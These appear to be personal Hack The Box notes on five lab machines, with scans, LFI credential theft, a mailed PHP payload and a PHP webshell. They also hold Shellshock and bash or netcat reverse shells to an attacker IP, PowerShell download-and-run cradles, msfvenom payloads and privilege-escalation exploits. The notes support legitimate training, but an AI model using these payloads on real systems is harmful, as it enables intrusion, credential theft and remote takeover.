RIGHTS=kxte ATOMIC RENAME LITERAL+<br />443/tcp   open  ssl/https?<br />|_ssl-date: 2019-07-02T23:07:08+00:00; -1h20m21s from scanner time.<br />993/tcp   open  ssl/imap   Cyrus imapd<br />|_imap-capabilities: CAPABILITY<br />995/tcp   open  pop3       Cyrus pop3d<br />3306/tcp  open  mysql      MySQL (unauthorized)<br />4445/tcp  open  upnotifyp?<br />10000/tcp open  http       MiniServ 1.570 (Webmin httpd)<br />|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).<br />Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com<br /><br />Host script results:<br />|_clock-skew: mean: -1h20m21s, deviation: 0s, median: -1h20m21s<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 345.43 seconds<br /><br />--------------------------------------------------------------------------------------------------------------------------------------------------------<br />dirbuster (/usr/share/wordlists/dirb/common.txt )<br /><br />went to <a href="https://10.10.10.7/">https://10.10.10.7/</a><br />    saw machine was Elastix<br />        searchsploit elastix<br />            Elastix 2.2.0 - &#39;graph.php&#39; Local File Inclusion   | exploits/php/webapps/37637.pl<br />            cat exploits/php/webapps/37637.pl<br />                file inclusion at /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action<br />                    navigated to <a href="https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action">https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</a><br />                    view page sourcecode<br />                    saw usernames and password jEhdIekWmdjE<br />                    ssh root@10.10.10.7 <br />                    jEhdIekWmdjE<br />                    ROOT SHELL<br />                    <br /> -----------------------------------------------------------------------------------------------------------------------------------------------------<br />root@kali:~# telnet 10.10.10.7 25<br />Trying 10.10.10.7...<br />Connected to 10.10.10.7.<br />Escape character is &#39;^]&#39;.<br />220 beep.localdomain ESMTP Postfix<br />EHLO coolhandsquid.au<br />250-beep.localdomain<br />250-PIPELINING<br />250-SIZE 10240000<br />250-VRFY<br />250-ETRN<br />250-ENHANCEDSTATUSCODES<br />250-8BITMIME<br />250 DSN<br />VRFY asterisk@localhost  <br />252 2.0.0 asterisk@localhost<br />mail from:coolhandsquid@step-child.au<br />250 2.1.0 Ok<br />rcpt to:asterisk@localhost<br />250 2.1.5 Ok<br />data<br />354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br />Subject: You got owned<br />&lt;?php echo system($_REQUEST[&#39;squid&#39;]); ?&gt;<br /><br />.<br />250 2.0.0 Ok: queued as 84C50D92F8<br />^C<br />^]<br />telnet&gt; quit<br />Connection closed.<br /><br />IN BURP<br />in repeater replace GET /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action HTTP/1.1<br />with GET /vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&amp;module=Accounts&amp;action HTTP/1.1<br />to verify code execution after &amp;action put &amp;squid=whoami           run it in repeater. this should return asterisk<br />right click &gt; change execution method<br />at the end add execution &amp;squid=bash -i &gt;&amp; /dev/tcp/10.10.14.60/3232 0&gt;&amp;1<br />highlight bash -i &gt;&amp; /dev/tcp/10.10.14.60/3232 0&gt;&amp;1 and hit &quot;control u&quot; to encode in url. should look like    bash+-i+&gt;%26+/dev/tcp/10.10.14.60/3232+0&gt;%261<br />in terminal<br />    nc -lvnp 3232<br />in burp<br />    run<br />in terminal<br />    observe your new shell!!<br />other terminal<br />    searchsploit -x exploits/php/webapps/18650.py (found by searchsploit elastix)<br />in terminal<br />listening on [any] 3232 ...<br />connect to [10.10.14.60] from (UNKNOWN) [10.10.10.7] 49037<br />bash: no job control in this shell<br />bash-3.2$ id<br />uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)<br />bash-3.2$ whoami<br />asterisk<br />bash-3.2$ sudo nmap --interactive<br /><br />Starting Nmap V. 4.11 ( <a href="http://www.insecure.org/nmap/">http://www.insecure.org/nmap/</a> )<br />Welcome to Interactive Mode -- press h &lt;enter&gt; for help<br />nmap&gt; whoami<br />Unknown command (whoami) -- press h &lt;enter&gt; for help<br />nmap&gt; !sh<br />id<br />uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)<br /><br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------<br />    <br />cp /usr/share/exploitdb/exploits/php/webapps/18650.py beep.py<br />nano beep.py (change lhost and what not. set extension to 322. extension found in 10.10.10.7/panel<br />python beep.py<br />    ssl handeling error<br />forward port 80 traffic to burp and 443 to 10.10.10.7<br />in script https -&gt; http<br />in burp<br />    proxy&gt;options&gt;add<br />        bind&gt;bind to port 80<br />        request handling&gt; redirect to host = 10.10.10.7 redirect to port=443<br />    make sure intercept is off<br />    send ran script to repeater<br />in terminal<br />    nc -lvnp 443<br />in burp<br />    go<br />in terminal <br />    enjoy your shell (you will still need to elevate.<br />    python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;<br /><br /><br />__________________----------------------------------------_____________________________---------------------_______________________------------<br /><br />SHELLSHOCK<br />send a get request for 10.10.10.7:10000 to burp repeater<br />set useragent- <br />User-Agent: () { :; }; bash -i &gt;&amp; /dev/tcp/10.10.14.60/3232 0&gt;&amp;1<br />in terminal<br />    nc -lvnp 3232<br />in burp<br />    go<br />in terminal<br />    enjoy your root shell!!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>10.10.10.8 Optimum</h1><br/>root@kali:~/Desktop/HTB/Optimum# nmap -sC -sV -oN 10.10.10.8.txt 10.10.10.8<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-09 20:01 EDT<br />Nmap scan report for 10.10.10.8<br />Host is up (0.13s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    HttpFileServer httpd 2.3<br />|_http-server-header: HFS 2.3<br />|_http-title: HFS /<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 22.51 seconds<br /><br />searchsploit HFS<br />searchsploit -p exploits/windows/remote/39161.py<br />cp /usr/share/exploitdb/exploits/windows/remote/39161.py Optimum39161.py<br />nano Optimum39161.py (changed ip to local ip and local port to 3232)<br />service apache2 start<br />copied nc.exe into /var/www/html<br />nc -lvnp 3232<br />ran Optimum39161.py twice, and got a user shell!<br /><br />added Find-AllVulns to the bottom of Sherlock.py and put Sherlock.py in /var/www/html/<br />bitsadmin /transfer SherlockJob /download <a href="http://10.10.14.60/Sherlock.ps1">http://10.10.14.60/Sherlock.ps1</a> C:\users\kostas\Downloads\Sherlock.ps1<br />powershell.exe C:\Users\kostas\Downloads\Sherlock.ps1<br />Title      : Secondary Logon Handle<br />MSBulletin : MS16-032&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br />CVEID      : 2016-0099<br />Link       : <a href="https://www.exploit-db.com/exploits/39719/">https://www.exploit-db.com/exploits/39719/</a><br />VulnStatus : Appears Vulnerable<br /><br />Title      : Windows Kernel-Mode Drivers EoP<br />MSBulletin : MS16-034<br />CVEID      : 2016-0093/94/95/96<br />Link       : <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1</a><br />             6-034?<br />VulnStatus : Appears Vulnerable<br /><br />Title      : Win32k Elevation of Privilege<br />MSBulletin : MS16-135<br />CVEID      : 2016-7255<br />Link       : <a href="https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S">https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S</a><br />             ample-Exploits/MS16-135<br />VulnStatus : Appears Vulnerable<br /><br />from powershell empire take the Invoke-MS16032.ps1 script and add                Invoke-MS16032 -Command C:\Users\kostas\Downloads\Invoke-PowerShellTcp.ps1                      to the bottom<br />from powershell empire take the Invoke-PowershellTCP.ps1 script and add          Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.60 -port 3233                                         to the bottom<br />host both of the files<br />bitsadmin /transfer Ms16032Job /download <a href="http://10.10.14.60/Sherlock.ps1">http://10.10.14.60/Invoke-MS16032.ps1</a> C:\users\kostas\Downloads\Invoke-MS16032.ps1<br />same for invoke powershell script<br />in terminal<br />    nc -nlvp 3233<br />C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe C:\Users\kostas\Downloads\Invoke-MS16032.ps1 (this is important because ms16032 exploits powershell v1.0)<br />&#39;HOLY HANDLE LEAK BATMAN!&quot; enjoy your shell<br /><br /><br /><br /><br /><br /><br /><br />powershell.exe IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60/80/sherlock.ps1')">http://10.10.14.60/Invoke-MS16032.ps1&#39;)</a><br />bitsadmin /transfer Ms16032Job /download <a href="http://10.10.14.60/Sherlock.ps1">http://10.10.14.60/Invoke-PowerShellTcp.ps1</a> C:\users\kostas\Downloads\Invoke-PowerShellTcp.ps1<br />IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60/80/sherlock.ps1')">http://10.10.14.60:80/Shell3232.ps1&#39;)</a><br />Invoke-MS16-032 -Command &quot;iex(New-Object Net.WebClient).DownloadString(&#39;<a href="http://google.com')"">http://google.com&#39;)&quot;</a><br />IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60/80/sherlock.ps1')">http://10.10.14.60:80/sherlock.ps1&#39;)</a></div><div class='page'><h1 class='title level-4'>10.10.10.9 Bastard</h1><br/>Nmap showed that only web and rpc was open.<br />dirsearch was running crazy slow, but did show me the directory /rest<br />when navigating to the website I saw that it was running drupal<br />drupwn enum showed me that it was running 7.54. We are in good shape!<br />drupwn exploit was able to upload a php webshell, but it was at a page I couldn&#39;t reach... back to the drawing board.<br />searchsploit showed me the exploit 41564.php<br />I added my own webshell so that I could upload and execute<br />###################################################################<br />$webshell = &lt;&lt;&lt;&#39;EOD&#39;<br />&lt;?php<br /> if (isset($_REQUEST[&#39;fupload&#39;])) {<br />  file_put_contents($_REQUEST[&#39;fupload&#39;], file_get_contents(&quot;http://10.10.14.60:8000/&quot; . $_REQUEST[&#39;fupload&#39;]));<br /> };<br /> if (isset($_REQUEST[&#39;fexec&#39;])) {<br />  $cmd = ($_REQUEST[&#39;fexec&#39;]);<br />  echo system($cmd);<br /> };<br />?&gt;<br />EOD;<br />##########################################################################<br />ran the exploit and it didn&#39;t work.<br />the endpoint_path was pointing to /rest_endpoint    which doesn&#39;t exist. change it to /rest (as found in dirsearch) and BOOM! upload complete!<br /><br />http://10.10.10.9/yee.php?fupload=nc.exe            uploads netcat<br /><a href="http://10.10.10.9/yee.php?fexec=nc.exe">http://10.10.10.9/yee.php?fexec=nc.exe</a>  10.10.14.60 3232 -e cmd.exe             gets reverse shell. User.txt!<br /><br />upload and run Sherlock.ps1 and see that the machine is vulnerable to MS15-051.<br />IMPORTANT<br />go to sec wiki and download the .zip version of the exploit. unzip, and upload ms15-051x64.exe<br /><br />ms15-051x64.exe whoami              system!<br />ms15-051x64.exe nc.exe 10.10.14.60 3233 -e cmd.exe<br />system shell!<br />root.txt<br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>41564.php<br /><br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.10.10.9 &amp;&amp; nmap -sC -sV -Pn 10.10.10.9 &amp;&amp; nmap -p- -Pn 10.10.10.9<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-21 10:35 EDT<br />Nmap scan report for 10.10.10.9<br />Host is up (0.15s latency).<br />Not shown: 997 filtered ports<br />PORT      STATE SERVICE<br />80/tcp    open  http<br />135/tcp   open  msrpc<br />49154/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 12.11 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-21 10:35 EDT<br />Nmap scan report for 10.10.10.9<br />Host is up (0.14s latency).<br />Not shown: 997 filtered ports<br />PORT      STATE SERVICE VERSION<br />80/tcp    open  http    Microsoft IIS httpd 7.5<br />|_http-generator: Drupal 7 (<a href="http://drupal.org)">http://drupal.org)</a><br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />| http-robots.txt: 36 disallowed entries (15 shown)<br />| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br />| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br />| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br />|_/LICENSE.txt /MAINTAINERS.txt<br />|_http-server-header: Microsoft-IIS/7.5<br />|_http-title: Welcome to 10.10.10.9 | 10.10.10.9<br />135/tcp   open  msrpc   Microsoft Windows RPC<br />49154/tcp open  msrpc   Microsoft Windows RPC<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 79.56 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-21 10:37 EDT<br />Nmap scan report for 10.10.10.9<br />Host is up (0.13s latency).<br />Not shown: 65532 filtered ports<br />PORT      STATE SERVICE<br />80/tcp    open  http<br />135/tcp   open  msrpc<br />49154/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 200.04 seconds</div><div class='page'><h1 class='title level-6'>web</h1><br/></div><div class='page'><h1 class='title level-7'>web nmap</h1><br/><br />PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Microsoft IIS httpd 7.5<br />|_http-server-header: Microsoft-IIS/7.5<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br /></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>nikto -host <a href="http://10.10.10.9:80">http://10.10.10.9:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.9<br />+ Target Hostname:    10.10.10.9<br />+ Target Port:        80<br />+ Start Time:         2020-04-21 10:42:24 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/7.5<br />+ Retrieved x-powered-by header: ARRAY(0x5565c81100e8)<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ Uncommon header &#39;x-generator&#39; found, with contents: Drupal 7 (<a href="http://drupal.org)">http://drupal.org)</a><br />+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response<br />+ Scan terminated:  20 error(s) and 3 item(s) reported on remote host<br />+ End Time:           2020-04-21 10:49:25 (GMT-4) (421 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/>python3 /Yeet/Tools/TireFire/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.10.10.9:80">http://10.10.10.9:80</a><br /><br /> _|. _ _  _  _  _ _|_    v0.3.9<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /Yeet/Tools/TireFire/dirsearch/logs/errors-20-04-21_10-42-23.log<br /><br />Target: <a href="http://10.10.10.9:80">http://10.10.10.9:80</a><br /><br />[10:42:25] Starting: <br />[10:42:32] 403 -    1KB - /.php<br />[10:42:36] 200 -    7KB - /index.php<br />[10:42:49] 403 -    1KB - /search/<br />[10:44:32] 403 -    1KB - /misc/<br />[10:45:13] 200 -    7KB - /0/<br />[10:45:14] 403 -    1KB - /themes/<br />[10:45:16] 200 -    7KB - /user/<br />[10:45:36] 403 -    1KB - /modules/<br />[10:48:43] 403 -    1KB - /admin/<br />[10:48:55] 403 -    1KB - /scripts/<br />[10:51:29] 200 -    7KB - /node/<br />CTRL+C detected: Pausing threads, please wait...<br /></div><div class='page'><h1 class='title level-7'>drupwn</h1><br/>git clone https://github.com/immunIT/drupwn.git<br />python3 setup.py install<br />drupwn enum http://10.10.10.9:80/</div><div class='page'><h1 class='title level-6'>privesc</h1><br/><br /><br />Title      : User Mode to Ring (KiTrap0D)<br />MSBulletin : MS10-015<br />CVEID      : 2010-0232<br />Link       : https://www.exploit-db.com/exploits/11199/<br />VulnStatus : Not supported on 64-bit systems<br /><br />Title      : Task Scheduler .XML<br />MSBulletin : MS10-092<br />CVEID      : 2010-3338, 2010-3888<br />Link       : https://www.exploit-db.com/exploits/19930/<br />VulnStatus : Appears Vulnerable<br /><br />Title      : NTUserMessageCall Win32k Kernel Pool Overflow<br />MSBulletin : MS13-053<br />CVEID      : 2013-1300<br />Link       : https://www.exploit-db.com/exploits/33213/<br />VulnStatus : Not supported on 64-bit systems<br /><br />Title      : TrackPopupMenuEx Win32k NULL Page<br />MSBulletin : MS13-081<br />CVEID      : 2013-3881<br />Link       : https://www.exploit-db.com/exploits/31576/<br />VulnStatus : Not supported on 64-bit systems<br /><br />Title      : TrackPopupMenu Win32k Null Pointer Dereference<br />MSBulletin : MS14-058<br />CVEID      : 2014-4113<br />Link       : https://www.exploit-db.com/exploits/35101/<br />VulnStatus : Not Vulnerable<br /><br />Title      : ClientCopyImage Win32k<br />MSBulletin : MS15-051<br />CVEID      : 2015-1701, 2015-2433<br />Link       : https://www.exploit-db.com/exploits/37367/<br />VulnStatus : Appears Vulnerable<br /><br />Title      : Font Driver Buffer Overflow<br />MSBulletin : MS15-078<br />CVEID      : 2015-2426, 2015-2433<br />Link       : https://www.exploit-db.com/exploits/38222/<br />VulnStatus : Not Vulnerable<br /><br />Title      : &#39;mrxdav.sys&#39; WebDAV<br />MSBulletin : MS16-016<br />CVEID      : 2016-0051<br />Link       : https://www.exploit-db.com/exploits/40085/<br />VulnStatus : Not supported on 64-bit systems<br /><br />Title      : Secondary Logon Handle<br />MSBulletin : MS16-032<br />CVEID      : 2016-0099<br />Link       : https://www.exploit-db.com/exploits/39719/<br />VulnStatus : Appears Vulnerable<br /><br />Title      : Windows Kernel-Mode Drivers EoP<br />MSBulletin : MS16-034<br />CVEID      : 2016-0093/94/95/96<br />Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1<br />             6-034?<br />VulnStatus : Not Vulnerable<br /><br />Title      : Win32k Elevation of Privilege<br />MSBulletin : MS16-135<br />CVEID      : 2016-7255<br />Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S<br />             ample-Exploits/MS16-135<br />VulnStatus : Not Vulnerable<br /><br />Title      : Nessus Agent 6.6.2 - 6.10.3<br />MSBulletin : N/A<br />CVEID      : 2017-7199<br />Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h<br />             tml<br />VulnStatus : Not Vulnerable</div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />ba22fde1932d06eb76a163d312f921a2<br />root<br />4bf12b963da1b30cc93496f617f7ba7c</div><div class='page'><h1 class='title level-4'>10.10.10.11 Arctic</h1><br/>root@kali:~/Desktop/Machines/HTB/Arctic# nmap -sC -sV -oN Arctic.txt 10.10.10.11 <br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-13 21:14 EDT<br />Nmap scan report for 10.10.10.11<br />Host is up (0.20s latency).<br />Not shown: 997 filtered ports<br />PORT      STATE SERVICE VERSION<br />135/tcp   open  msrpc   Microsoft Windows RPC<br />8500/tcp  open  fmtp?<br />49154/tcp open  msrpc   Microsoft Windows RPC<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 149.70 seconds<br /><br />8500 = cold fusion<br /><a href="http://10.10.10.11:8500/cfdocs/dochome.htm">http://10.10.10.11:8500/cfdocs/dochome.htm</a> lets me know it is adobe coldfusion 8<br />searchsploit coldfusion (second one is a directory traversal)<br />searchsploit -x exploits/multiple/remote/14641.py<br /><a href="http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en">http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</a><br />username = admin (given)<br />hash    =  2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03<br /><a href="https://crackstation.net/">https://crackstation.net/</a>           sha1 PASSWORD=  happyday<br /><br /><br /><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.60 LPORT=443 -f raw &gt; shell.jsp</code><br /><br />host shell.jsp with a python SimpleHttpserver<br />download with a scheduled task &gt;Debugging &amp; Logging &gt; scheduled tasks<br />    taskname    = revshell<br />    frequency   = one-time<br />    url              = <a href="http://10.10.14.60:8000/shell.jsp">http://10.10.14.60:8000/shell.jsp</a><br />    pubish          = x (save output to file)<br />    file            = C:\ColdFusion8\wwwroot\CFIDE\shell.jsp<br />    submit<br />    run scheduled task<br />    nc -nlvp 443<br />    Navigate to <a href="http://10.10.10.11:8500/CFIDE/shell.jsp">http://10.10.10.11:8500/CFIDE/shell.jsp</a> (caps are important!!!)<br />    enjoy your user shell<br /><br />copy sherlock into webdir<br />powershell.exe IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60:8000/Sherlock.ps1')">http://10.10.14.60:8000/Sherlock.ps1&#39;)</a><br />------------------------------------------------------------------------------------------------------------------------------<br /><br />Title      : Task Scheduler .XML<br />MSBulletin : MS10-092<br />CVEID      : 2010-3338, 2010-3888<br />Link       : <a href="https://www.exploit-db.com/exploits/19930/">https://www.exploit-db.com/exploits/19930/</a><br />VulnStatus : Appears Vulnerable<br /><br />Title      : Secondary Logon Handle<br />MSBulletin : MS16-032<br />CVEID      : 2016-0099<br />Link       : <a href="https://www.exploit-db.com/exploits/39719/">https://www.exploit-db.com/exploits/39719/</a><br />VulnStatus : Appears Vulnerable<br />------------------------------------------------------------------------------------------------------------------------------------<br /><br />MS10-092 is also known as Chimichurri<br /><a href="https://github.com/Re4son/Chimichurri">https://github.com/Re4son/Chimichurri</a> &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;badass. the exe is already compiled<br />put the .exe in the WebHost dir<br /><br />cd C:\ColdFusion8\ &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;muy Importante!! needed to run the script<br />echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1<br />echo $url = &quot;http://10.10.14.60:8000/Chimichurri.exe&quot; &gt;&gt;wget.ps1<br />echo $file = &quot;exploit.exe&quot; &gt;&gt;wget.ps1<br />echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1<br />powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1<br />(start nc -nlvp 443)<br />exploit.exe 10.10.14.60 443<br />Enjoy your system shell!<br /><br /><br /><br /><br /><br />echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget2.ps1<br />echo $url = &quot;http://10.10.14.60:8000/Invoke-MS16032.ps1&quot; &gt;&gt;wget2.ps1<br />echo $file = &quot;MS16032.ps1&quot; &gt;&gt;wget2.ps1<br />echo $webclient.DownloadFile($url,$file) &gt;&gt;wget2.ps1<br />powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget2.ps1<br /><br />powershell.exe MS16032.ps1 <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />msfvenom -p windows/shell/reverse_tcp -e x86/shikata_ga_nai LHOST=10.10.14.60 LPORT=3234 -f ps1 &gt; shart.ps1<br /><br />cp /root/Desktop/Tools/Empire/data/module_source/privesc/Invoke-MS16032.ps1 .<br />cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .<br />vi Invoke-Ms16032.ps1<br />    Invoke-MS16032 -Command “IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60:8000/reverseshell3235.ps1')">http://10.10.14.60:8000/reverseshell3235.ps1&#39;)</a>”               &lt;&lt;add to bottom<br />vi Invoke-PowerShellTcp.ps1<br />    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.60 -port 3235                     &lt;&lt;add to bottom<br /><br />C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60:8000/Sherlock.ps1')">http://10.10.14.60:8000/Invoke-MS16032.ps1&#39;)</a><br />bitsadmin /transfer Ms16032Job /download <a href="http://10.10.14.60/Sherlock.ps1">http://10.10.14.60:8000/Invoke-MS16032.ps1</a> C:\users\tolis\Desktop\Invoke-MS16032.ps1<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f asp &gt; reverse.asp</code></div><div class='page'><h1 class='title level-4'>10.10.10.14 Grandpa</h1><br/>root@kali:~/Desktop/Machines/HTB/Grandpa# nmap -sC -sV -oN Grandpa.txt 10.10.10.14<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-16 23:06 EDT<br />Nmap scan report for 10.10.10.14<br />Host is up (0.44s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Microsoft IIS httpd 6.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH<br />|_http-server-header: Microsoft-IIS/6.0<br />|_http-title: Under Construction<br />| http-webdav-scan: <br />|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH<br />|   Server Date: Wed, 17 Jul 2019 03:06:57 GMT<br />|   Server Type: Microsoft-IIS/6.0<br />|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK<br />|_  WebDAV type: Unkown<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 38.76 seconds<br /><br />davtest -url <a href="http://10.10.10.14">http://10.10.10.14</a><br />    all fail<br />    <br />dirbuster<br />    5 dirs (all trash)<br />    <br />davtest -url <a href="http://10.10.10.14">http://10.10.10.14</a><br />######machine will break upon its own accord. if the davtest is all fails, reboot the machine.#########<br />-------------------------------------------------------------------------------------------------------------------------------------------------------<br />exploit(windows/iis/iis_webdav_scstoragepathfromurl)<br />    network service shell<br />post(multi/recon/local_exploit_suggester)<br /> [*] 10.10.10.14 - Collecting local exploits for x86/windows...<br />[*] 10.10.10.14 - 29 exploit checks are being tried...<br />[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.<br />[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.<br />[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.<br />[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.<br />&gt;&gt;&gt;&gt;[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;we are doing webdav stuff, so this is interesting<br />[+] 10.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.<br />[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.<br />[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.<br />[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.<br /><br />exploit(windows/local/ms16_016_webdav)<br />starts notepad process as system<br />inject into the process<br />enjoy system shell<br />-----------------------------------------------------------------------------------------------------------------------------------------------------------<br />Without msfconsole<br />msfvenom -p windows/shell/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.14.60 LPORT=3232 &gt; GitShellcode.txt<br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br />#msfvenom -p windows/shell/reverse_tcp -f raw -v sc -e x86/alpha_mixed 